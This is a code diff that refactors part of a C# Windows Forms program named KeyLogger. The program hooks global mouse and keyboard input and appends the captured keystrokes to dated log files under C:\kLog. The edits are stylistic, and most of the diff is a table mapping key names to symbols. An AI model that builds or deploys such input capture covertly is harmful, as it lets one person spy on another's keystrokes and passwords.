@@ -1,15 +1,15 @@
-using System.Text;
-
 using Gaten.Net.Windows.Forms;
+
+using System.Text;
 
 namespace Gaten.Data.KeyLogger
 {
     public partial class MainForm : Form
     {
-        UserActivityHook hook;
-        Thread keyLogThread;
-        bool On = true;
-        string log;
+        private UserActivityHook hook = new();
+        private Thread keyLogThread = default!;
+        private bool On = true;
+        private string log = string.Empty;
 
         public MainForm()
         {
@@ -45,7 +45,7 @@ namespace Gaten.Data.KeyLogger
 
         }
 
-        void SaveLog()
+        private void SaveLog()
         {
             // 로그 파일을 날짜별로 저장하기 위해 오늘 날짜를 구함
             string today = DateTime.Now.ToString("yyyy-MM-dd");
@@ -53,7 +53,7 @@ namespace Gaten.Data.KeyLogger
 
             if (!Directory.Exists(@"C:\kLog"))
             {
-                Directory.CreateDirectory(@"C:\kLog");
+                _ = Directory.CreateDirectory(@"C:\kLog");
             }
 
             File.AppendAllLines(fileName, new List<string> { DateTime.Now.ToString("yyyy-MM-dd HH:mm") + " " + log }, Encoding.UTF8);
@@ -62,7 +62,7 @@ namespace Gaten.Data.KeyLogger
             log = string.Empty;
         }
 
-        void keyLogger()
+        private void keyLogger()
         {
             // 마우스 후킹
             hook.OnMouseActivity += (sender, e) =>
@@ -89,59 +89,58 @@ namespace Gaten.Data.KeyLogger
 
         public string KeysString(string keyString)
         {
-            string toString = string.Empty;
-            switch (keyString)
+            string toString = keyString switch
             {
-                case "Capital": toString = "CapsLock"; break;
-                case "D0": toString = "0"; break;
-                case "D1": toString = "1"; break;
-                case "D2": toString = "2"; break;
-                case "D3": toString = "3"; break;
-                case "D4": toString = "4"; break;
-                case "D5": toString = "5"; break;
-                case "D6": toString = "6"; break;
-                case "D7": toString = "7"; break;
-                case "D8": toString = "8"; break;
-                case "D9": toString = "9"; break;
-                case "Add": toString = "+"; break;
-                case "Subtract": toString = "-"; break;
-                case "Multiply": toString = "*"; break;
-                case "Divide": toString = "/"; break;
-                case "Up": toString = "↑"; break;
-                case "Down": toString = "↓"; break;
-                case "Left": toString = "←"; break;
-                case "Right": toString = "→"; break;
-                case "Escape": toString = "ESC"; break;
-                case "Oemtilde": toString = "`"; break;
-                case "OemMinus": toString = "-"; break;
-                case "Oemplus": toString = "="; break;
-                case "Oem5": toString = "\\"; break;
-                case "Next": toString = "PageDown"; break;
-                case "OemOpenBrackets": toString = "["; break;
-                case "Oem6": toString = "]"; break;
-                case "Oem1": toString = ";"; break;
-                case "Oem7": toString = "'"; break;
-                case "Oemcomma": toString = ","; break;
-                case "OemPeriod": toString = "."; break;
-                case "OemQuestion": toString = "/"; break;
-                case "Return": toString = "Enter"; break;
-                case "Scroll": toString = "ScrollLock"; break;
-                case "LWin": toString = "Window"; break;
-                case "HanjaMode": toString = "Hanja"; break;
-                case "KanaMode": toString = "Kana"; break;
-                case "Decimal": toString = "."; break;
-                case "NumPad0": toString = "N0"; break;
-                case "NumPad1": toString = "N1"; break;
-                case "NumPad2": toString = "N2"; break;
-                case "NumPad3": toString = "N3"; break;
-                case "NumPad4": toString = "N4"; break;
-                case "NumPad5": toString = "N5"; break;
-                case "NumPad6": toString = "N6"; break;
-                case "NumPad7": toString = "N7"; break;
-                case "NumPad8": toString = "N8"; break;
-                case "NumPad9": toString = "N9"; break;
-                default: toString = keyString; break;
-            }
+                "Capital" => "CapsLock",
+                "D0" => "0",
+                "D1" => "1",
+                "D2" => "2",
+                "D3" => "3",
+                "D4" => "4",
+                "D5" => "5",
+                "D6" => "6",
+                "D7" => "7",
+                "D8" => "8",
+                "D9" => "9",
+                "Add" => "+",
+                "Subtract" => "-",
+                "Multiply" => "*",
+                "Divide" => "/",
+                "Up" => "↑",
+                "Down" => "↓",
+                "Left" => "←",
+                "Right" => "→",
+                "Escape" => "ESC",
+                "Oemtilde" => "`",
+                "OemMinus" => "-",
+                "Oemplus" => "=",
+                "Oem5" => "\\",
+                "Next" => "PageDown",
+                "OemOpenBrackets" => "[",
+                "Oem6" => "]",
+                "Oem1" => ";",
+                "Oem7" => "'",
+                "Oemcomma" => ",",
+                "OemPeriod" => ".",
+                "OemQuestion" => "/",
+                "Return" => "Enter",
+                "Scroll" => "ScrollLock",
+                "LWin" => "Window",
+                "HanjaMode" => "Hanja",
+                "KanaMode" => "Kana",
+                "Decimal" => ".",
+                "NumPad0" => "N0",
+                "NumPad1" => "N1",
+                "NumPad2" => "N2",
+                "NumPad3" => "N3",
+                "NumPad4" => "N4",
+                "NumPad5" => "N5",
+                "NumPad6" => "N6",
+                "NumPad7" => "N7",
+                "NumPad8" => "N8",
+                "NumPad9" => "N9",
+                _ => keyString,
+            };
             return toString;
         }
 
